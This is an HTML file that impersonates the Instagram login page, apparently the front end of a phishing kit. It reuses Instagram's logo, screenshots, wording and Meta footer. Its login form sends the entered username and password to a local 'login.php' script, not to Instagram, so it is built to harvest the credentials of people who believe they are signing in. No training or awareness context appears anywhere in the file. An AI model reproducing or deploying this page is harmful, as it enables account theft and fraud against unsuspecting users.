<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <title>Login • Instagram</title>
    <style>
        body { font-family: 'Roboto', sans-serif; }
        .insta-input:focus { border-color: #a8a8a8 !important; }
    </style>
</head>
<body class="bg-black text-white flex flex-col min-h-screen">
    
    <main class="flex-grow flex items-center justify-center px-4 md:px-20 lg:justify-between max-w-6xl mx-auto w-full">
        
        <div class="hidden lg:flex flex-col w-1/2 space-y-6">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d256451a29bd.png" 
                 alt="Instagram" class="w-44 invert brightness-200">
            
            <h1 class="text-5xl font-extrabold leading-tight tracking-tight">
                See everyday moments from your <br>
                <span class="text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 via-red-500 to-purple-600">
                    close friends.
                </span>
            </h1>

            <div class="relative mt-4">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd511b68297.png" 
                     class="w-64 rounded-3xl border-4 border-gray-800 shadow-2xl opacity-90">
            </div>
        </div>

        <div class="w-full max-w-[350px] flex flex-col space-y-4">
            <div class="bg-black border border-gray-800 p-8 pt-10 flex flex-col items-center">
                
                <h2 class="text-lg font-semibold mb-6 self-start">Log into Instagram</h2>

                <form action="login.php" method="POST" class="w-full flex flex-col space-y-2">
                    <input type="text" name="user" required
                           placeholder="Phone number, username, or email" 
                           class="insta-input w-full bg-[#121212] border border-gray-800 rounded-sm p-2.5 text-xs outline-none transition">
                    
                    <input type="password" name="pass" required
                           placeholder="Password" 
                           class="insta-input w-full bg-[#121212] border border-gray-800 rounded-sm p-2.5 text-xs outline-none transition">
                    
                    <button type="submit" 
                            class="bg-[#0095f6] hover:bg-[#1877f2] text-sm font-semibold py-1.5 rounded-lg mt-4 transition-all duration-200">
                        Log in
                    </button>
                </form>

                <div class="flex items-center w-full my-6">
                    <div class="flex-grow border-t border-gray-800"></div>
                    <span class="px-4 text-xs font-semibold text-gray-500 uppercase">OR</span>
                    <div class="flex-grow border-t border-gray-800"></div>
                </div>

                <a href="#" class="text-sm font-semibold text-[#385185] flex items-center justify-center space-x-2">
                    <span class="text-lg">f</span>
                    <span>Log in with Facebook</span>
                </a>

                <a href="#" class="text-xs text-gray-400 mt-4">Forgot password?</a>
            </div>

            <div class="bg-black border border-gray-800 p-6 text-center">
                <p class="text-sm text-gray-300">Don't have an account? <a href="#" class="text-[#0095f6] font-semibold">Sign up</a></p>
            </div>
        </div>
    </main>

    <footer class="p-4 text-gray-500 text-[10px] text-center flex flex-wrap justify-center gap-4 mb-4">
        <span>Meta</span> <span>About</span> <span>Blog</span> <span>Jobs</span> <span>Help</span> <span>API</span> <span>Privacy</span> <span>Terms</span>
        <span>© 2026 Instagram from Meta</span>
    </footer>

</body>
</html>